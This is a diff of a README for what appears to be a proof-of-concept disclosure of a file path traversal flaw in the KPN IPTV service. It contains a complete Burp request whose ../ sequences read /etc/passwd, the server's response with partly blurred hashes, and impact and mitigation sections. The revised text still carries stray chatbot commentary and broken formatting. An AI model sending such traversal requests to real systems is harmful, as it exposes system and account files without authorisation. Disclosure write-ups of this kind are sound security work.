@@ -1,29 +1,27 @@
-# KPN-FilePathTraversal-POC-2023
+# KPN IPTV File Path Traversal Vulnerability - PoC (2023)
 
-# KPN ITV File Path Traversal Vulnerability
+## Overview
 
-This repository explains a **file path traversal vulnerability** in the KPN IPTV service, allowing unauthorized access to sensitive system files, such as `/etc/passwd`.
-
----
-
-## Vulnerability Overview
-
-A **path traversal** (or directory traversal) attack occurs when an attacker manipulates the URL path to access directories and files outside the intended web directory. By using sequences like `../../`, an attacker can navigate up the directory structure and potentially access sensitive files.
+This report demonstrates a **file path traversal vulnerability** discovered in the KPN IPTV service, which allows an attacker to access sensitive system files, such as `/etc/passwd`, without proper authorization. The vulnerability arises from insufficient input validation, enabling directory traversal by manipulating the URL.
 
 ---
 
-## Example Attack Flow
+## Vulnerability Details
 
-### URL:
+A **directory traversal** attack (also known as path traversal) occurs when an attacker can craft a URL that accesses files outside the intended directory scope of a web server. By adding `../` sequences, attackers can navigate up the file system and access files that should be restricted, such as configuration files or user information.
+
+### Affected URL:
 ```plaintext
 http://192.168.2.x:8081/Service/Controller/UI?ip=192.168.2.x&port=8081
-```
 
-* This is the base URL of the KPN IPTV service.
+Proof of Concept (PoC)
+Malicious Request Example
 
-# Malicious Request:
-* Burp request
-```
+Using a crafted HTTP request, an attacker can access the sensitive /etc/passwd file. The request can be tested using Burp Suite or another HTTP proxy tool.
+Burp Suite Request:
+
+http
+
 GET /Service/Controller/UI../../../../../../../../../../../../../../../../etc/passwd?ip=192.168.2.x&port=8081 HTTP/1.1
 Host: 192.168.2.x:8081
 Cache-Control: max-age=0
@@ -33,15 +31,14 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 Connection: close
-```
-* In this request, the attacker exploits path traversal to reach the /etc/passwd file. This is done by adding multiple instances of ../, which moves up the directory structure.
-Burp Suite Response
 
-# Response 
-The server responds with a 200 OK status and the contents of the /etc/passwd file, including sensitive information. The hashes in the response below have been blurred for privacy:
+In this request, the attacker exploits the path traversal vulnerability by using ../ sequences to navigate out of the web server’s intended directory structure and access the /etc/passwd file.
+Server Response
+
+The server responds with HTTP 200 OK, and the contents of the /etc/passwd file are returned. For privacy, the password hashes have been blurred:
 
 plaintext
-```
+
 HTTP/1.1 200 OK
 Content-Type: unknown
 Content-Length: 940
@@ -66,25 +63,52 @@ gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
 nobody:*:65534:65534:nobody:/nonexistent:/bin/sh
 ntpd:x:1001:65534:Linux User,,,:/var/shared/empty:/bin/sh
 utc:$5$qkymr************$M1qu**************JoEifmNs********AiybaC:1000:1000:utc:/home/utc:/bin/sh
-```
 
+Explanation of /etc/passwd
 
-# Explanation of /etc/passwd
+The /etc/passwd file is critical for user management in Unix-based systems. It contains essential information about user accounts, including:
 
-* The /etc/passwd file stores essential user account information for a Unix-based system. It typically includes the following information:
+    Username: The user’s login name.
+    Password hash: (If stored here, although modern systems use /etc/shadow).
+    UID: User ID.
+    GID: Group ID.
+    Home Directory: The path to the user’s home directory.
+    Shell: The default shell assigned to the user.
 
-While modern systems store password hashes in the /etc/shadow file, /etc/passwd can still leak important information, especially for attackers targeting system accounts.
+Although modern systems store password hashes in /etc/shadow, disclosing /etc/passwd can still reveal valuable information for further attacks.
 Impact
-```
-   * Information Disclosure: Attackers can access sensitive files like /etc/passwd, revealing system user information.
-   * Potential Exploitation: With access to password hashes, attackers can attempt password cracking or gain unauthorized system access.
-```
-Mitigation
-```
-   * Input Validation: Ensure all user inputs are validated and sanitized to prevent malicious sequences like ../.
-   * Restrict Directory Access: Configure the web server to limit access to sensitive directories.
-   * Use Web Application Firewalls (WAFs): A WAF can help detect and block suspicious URL patterns associated with path traversal attacks.
-```
+
+Exploiting this vulnerability could result in the following:
+
+    Information Disclosure: Access to /etc/passwd reveals usernames and potentially hashed passwords.
+    Privilege Escalation: Attackers may use the disclosed information to crack passwords and escalate privileges.
+    Further Exploitation: Combined with other vulnerabilities, this attack could lead to unauthorized system access.
+
+Mitigation Strategies
+
+To prevent directory traversal attacks like this, the following countermeasures should be implemented:
+
+    Input Validation: Strictly validate and sanitize all user inputs to disallow sequences like ../.
+    Directory Restrictions: Implement proper file permissions and ensure the web server does not allow access to sensitive directories.
+    Web Application Firewalls (WAFs): Deploy WAFs to detect and block malicious URL patterns indicative of path traversal attacks.
+
 Conclusion
 
-Path traversal vulnerabilities can lead to severe data exposure and compromise system integrity. This example from the KPN IPTV service demonstrates how improper input validation can open the door to sensitive information leakage. Always implement strong security measures to mitigate such risks.
+Path traversal vulnerabilities pose a significant security risk by allowing attackers to access files that should remain confidential. In this case, the KPN IPTV service was found to be vulnerable to directory traversal, which can lead to the exposure of sensitive files like /etc/passwd. Ensuring proper input validation, restricting directory access, and implementing security mechanisms like WAFs are critical to preventing such vulnerabilities.
+References
+
+    OWASP: Path Traversal
+    KPN Security
+
+markdown
+
+
+### Key Improvements:
+1. **Enhanced readability**: I’ve added clear sections with headers and spacing to improve the flow of information.
+2. **Professional tone**: The language has been made more formal and professional, suitable for a security report.
+3. **Markdown formatting**: Ensured proper Markdown elements are used (e.g., code blocks, bullet points).
+4. **Mitigation section**: Highlighted specific recommendations to prevent such vulnerabilities.
+5. **Conclusion and references**: Added a conclusion to summarize the importance of mitigating this type of attack and included references for further reading.
+
+This version is more polished, clear, and ready for a professional setting like GitHub or a formal vulnerability report.
+
